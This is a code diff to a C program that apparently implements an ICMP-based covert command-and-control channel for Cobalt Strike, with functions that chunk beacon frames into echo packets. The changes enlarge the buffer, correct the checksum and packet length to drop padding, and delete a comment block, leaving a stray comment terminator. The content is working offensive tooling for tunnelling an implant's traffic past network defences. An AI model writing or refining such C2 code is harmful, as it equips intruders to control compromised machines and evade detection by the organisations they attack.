@@ -71,7 +71,7 @@ ex:
 #define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
 //Cobalt Strike Settings
 #define PAYLOAD_MAX_SIZE (512 * 1024)
-#define BUFFER_MAX_SIZE (1024 * 1024)
+#define BUFFER_MAX_SIZE (1024 * 1024) * 10 //10mb
 ///////////////////////////////////////////////////////////////////////
 //Ohkay actual code stuff now:
 
@@ -147,7 +147,12 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 //   payload_len  = total length of `payload` (must be ≤ ICMP_PAYLOAD_SIZE)
 //   seq_num      = sequence number to include (0 for “size” packet, 1..N for data chunks)
 //
+
 int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num) {
+    // Calculate exact ICMP packet length: header + payload, this is a patched version that does not send the whole payload size as 0's for buffer.
+    int icmp_packet_len = sizeof(struct icmp_header) + payload_len;
+
+    // Zero out just that many bytes (optional, since we'll overwrite header+payload)
     char packet[MAX_PACKET_SIZE] = { 0 };
     struct icmp_header* icmp = (struct icmp_header*)packet;
 
@@ -156,13 +161,23 @@ int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int paylo
     icmp->ID = htons((USHORT)GetCurrentProcessId());
     icmp->Sequence = htons(seq_num);
 
-    // Copy `payload_len` bytes of (TAG + data) right after the 8-byte ICMP header
+    // Copy payload (TAG + data) immediately after the 8-byte ICMP header
     memcpy(packet + sizeof(struct icmp_header), payload, payload_len);
 
+    // Compute checksum over exactly (header + payload)
     icmp->Checksum = 0;
-    icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));
+    icmp->Checksum = checksum((USHORT*)packet, icmp_packet_len);
 
-    int result = sendto(s, packet, sizeof(packet), 0, (SOCKADDR*)dest, sizeof(*dest));
+    // Send only header + payload (no trailing zero‐padding)
+    int result = sendto(
+        s,
+        packet,
+        icmp_packet_len,
+        0,
+        (SOCKADDR*)dest,
+        sizeof(*dest)
+    );
+
     if (result == SOCKET_ERROR) {
         printf("[-] sendto failed: %d\n", WSAGetLastError());
         return -1;
@@ -170,19 +185,6 @@ int send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int paylo
     printf("[+] Sent ICMP Echo Request: seq=%d, payload_len=%d\n", seq_num, payload_len);
     return 0;
 }
-
-//
-// recv_icmp_fragments: block until all chunks (including seq 0) arrive as Echo Replies.
-// Only processes packets satisfying:
-//   - ICMP.Type    == ICMP_ECHOREPLY (0)
-//   - ICMP.Code    == 0
-//   - ICMP.ID      == GetCurrentProcessId()
-//   - payload starts with “RQ47”
-// Reassembles chunks of data (each chunk carries up to ICMP_PAYLOAD_SIZE−TAG_SIZE bytes).
-//
-/*
-if seq == 0: Payload inbound (has size of inbound payload)
-if seq > 0: normal messages 
 
 */
 char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
